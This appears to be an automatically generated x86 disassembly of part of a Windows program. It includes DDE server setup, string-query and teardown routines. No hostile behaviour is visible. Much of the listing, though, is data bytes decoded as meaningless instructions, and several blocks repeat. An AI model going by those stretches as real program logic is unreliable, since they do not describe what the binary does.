add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x2137ffbe ] ah
inc esi
add [ esi ] cl
inc edx
sbb cl 0x46
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
jb r-xdata
add [ edi ] al
pop es
inc esi
ror [ eax ] 0xba
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov edx 0xba5c0046
inc esi
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ esi ] cl
mov ebx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x26c3ffbe ] ah
inc esi
inc edx
in al 0xd1
inc esi
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
add [ esi ] cl
add [ eax ] al
jb r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insd
nop
pop esp
mov edx 0xc070046
push esp
inc esp
push ebx
jb r-xdata
call sub_408d00
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x140046bb ] ch
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
outsd
outsb
jbe r-xdata
add [ eax ] dh
or al [ edx ]
je r-xdata
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcf9
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add al bl
pop es
inc edx
add ah dl
xor al 0x40
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
and [ ebx + 0xc070046 ] bh
push esp
inc esp
push ebx
jb r-xdata
int3
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
sar [ ebx + 0xb070046 ] 0x54
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xbb906d65
inc esi
add [ ebx * 2 + 0x10041 ] bl
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
inc ecx
add [ ebx + ecx + 0x42 ] ah
inc ecx
add [ edx + ecx - 0x76f3ffbe ] cl
insd
or [ edx + 0x6ad00046 ] bh
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
int3
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc ecx
add al al
outsd
outsb
jbe r-xdata
add [ esi ] cl
mov edx 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
nop
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ebx 0xbbc00046
inc esi
add [ eax ] al
add [ eax ] al
sub_46b8f5
mov edi 0x89f00046
inc ecx
add [ edx + ecx - 0x76f3ffbe ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
add [ esi + ecx - 0x40efffbe ] ah
inc esi
add [ esi ] cl
inc edx
inc esi
add [ eax + eax ] cl
add ah dl
imul eax [ ecx ] sub_420e84
int3
ror [ eax - 0x47 ] 0x46
push esp
inc esp
dec ebp
jb r-xdata
mov eax 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
mov al 0xb9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b9 ] dh
add [ eax ] al
add al dl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x46 ] cl
inc esi
add [ eax ] al
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add bh bl
inc esi
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x2137ffbe ] ah
inc esi
add [ esi ] cl
inc edx
sbb cl 0x46
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
jb r-xdata
add [ edi ] al
pop es
inc esi
ror [ eax ] 0xba
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov edx 0xba5c0046
inc esi
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ esi ] cl
mov ebx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x26c3ffbe ] ah
inc esi
inc edx
in al 0xd1
inc esi
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
add [ esi ] cl
add [ eax ] al
jb r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insd
nop
pop esp
mov edx 0xc070046
push esp
inc esp
push ebx
jb r-xdata
call sub_408d00
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x140046bb ] ch
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
outsd
outsb
jbe r-xdata
add [ eax ] dh
or al [ edx ]
je r-xdata
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcf9
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add al bl
pop es
inc edx
add ah dl
xor al 0x40
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
and [ ebx + 0xc070046 ] bh
push esp
inc esp
push ebx
jb r-xdata
int3
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
sar [ ebx + 0xb070046 ] 0x54
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xbb906d65
inc esi
add [ ebx * 2 + 0x10041 ] bl
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
inc ecx
add [ ebx + ecx + 0x42 ] ah
inc ecx
add [ edx + ecx - 0x76f3ffbe ] cl
insd
or [ edx + 0x6ad00046 ] bh
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
int3
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc ecx
add al al
outsd
outsb
jbe r-xdata
add [ esi ] cl
mov edx 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
nop
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ebx 0xbbc00046
inc esi
add [ eax ] al
add [ eax ] al
sub_46b968
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xb9
inc esi
add [ eax + eax ] cl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
inc edx
add [ ebx + ecx + 0x42 ] bh
outsd
jb r-xdata
sbb cl 0x46
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
jb r-xdata
inc esi
add [ edi ] al
pop es
ror [ eax ] 0xba
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov edx 0xba5c0046
inc esi
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ esi ] cl
mov ebx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
je r-xdata
push esp
inc esp
dec ebp
jb r-xdata
mov eax 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
mov al 0xb9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046b9 ] dh
add [ eax ] al
add al dl
jo r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x26c3ffbe ] ah
inc esi
inc edx
in al 0xd1
inc esi
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
add [ esi ] cl
add [ eax ] al
jb r-xdata
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
insd
nop
pop esp
mov edx 0xc070046
push esp
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x46 ] cl
inc esi
add [ eax ] al
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add bh bl
inc esi
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x2137ffbe ] ah
inc esi
add [ esi ] cl
inc edx
call sub_408d00
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x140046bb ] ch
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
outsd
outsb
jbe r-xdata
add [ eax ] dh
or al [ edx ]
je r-xdata
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcf9
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add al bl
pop es
inc edx
add ah dl
xor al 0x40
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
and [ ebx + 0xc070046 ] bh
push esp
inc esp
push ebx
jb r-xdata
int3
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
sar [ ebx + 0xb070046 ] 0x54
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xbb906d65
inc esi
add [ ebx * 2 + 0x10041 ] bl
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
inc ecx
add [ ebx + ecx + 0x42 ] ah
inc ecx
add [ edx + ecx - 0x76f3ffbe ] cl
insd
or [ edx + 0x6ad00046 ] bh
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
int3
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc ecx
add al al
outsd
outsb
jbe r-xdata
add [ esi ] cl
mov edx 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
nop
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ebx 0xbbc00046
inc esi
add [ eax ] al
add [ eax ] al
sub_46ba84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov edx 0xbb200046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
mov ebx r--data
add [ eax ] al
aam 0x69
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ esi + ecx - 0x26c3ffbe ] ah
inc esi
inc edx
in al 0xd1
inc esi
add al dh
mov [ ecx ] eax
clc
mov [ ecx ] eax
or al 0x89
inc ecx
add [ esi ] cl
add [ eax ] al
jb r-xdata
call sub_408d00
jmp r-xdata
insd
nop
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x140046bb ] ch
add [ eax ] al
add [ eax - 0x3fffbea4 ] ch
outsd
outsb
jbe r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcf9
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sbb cl 0x46
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ ebx + ecx + 0x42 ] ah
add [ eax ] dh
or al [ edx ]
je r-xdata
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
and [ ebx + 0xc070046 ] bh
push esp
inc esp
push ebx
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
sar [ ebx + 0xb070046 ] 0x54
inc esp
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xbb906d65
inc esi
add [ ebx * 2 + 0x10041 ] bl
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc ecx
add al al
outsd
outsb
jbe r-xdata
add [ esi ] cl
mov edx 0x6ad00046
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
lea eax [ eax ]
nop
mov ebx 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
mov ebx 0xbbc00046
inc esi
add [ eax ] al
add [ eax ] al
sub_46bc00
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor edx edx
push ebp
push sub_46bcf2
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bcf9
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408d00
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d38
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408d00
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d38
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408d00
sub_46bd00
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_46c0a8
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_46c15c
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_46c1c0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46db68
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46dc1c
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46db38
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46da04
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46dc3c
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_46cda8
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_46dc3c
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_46cdf4
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_46c2a4
mov eax ebx
call sub_46cdb0
jmp r-xdata
sub_46bf10
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46bfc4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_420714
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_46bd00
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_46bc00
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029f4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_46c2ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bfcb
lea eax [ ebp - 0x4 ]
call sub_404008
retn
add esp 0xfffffff0
call sub_4035dc
sub_46bfed
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_403644
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_403290
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_46c3a0
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_420760
test bl bl
jle r-xdata
call sub_403290
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_403290
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_418310
call sub_403290
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40362c
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_418310
call sub_403290
inc edi
dec esi
jne r-xdata
sub_46c0a8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46c14c
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_4040f8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46c3cc
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_46c41c
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c153
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov bl 0x1
sub_46c15c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
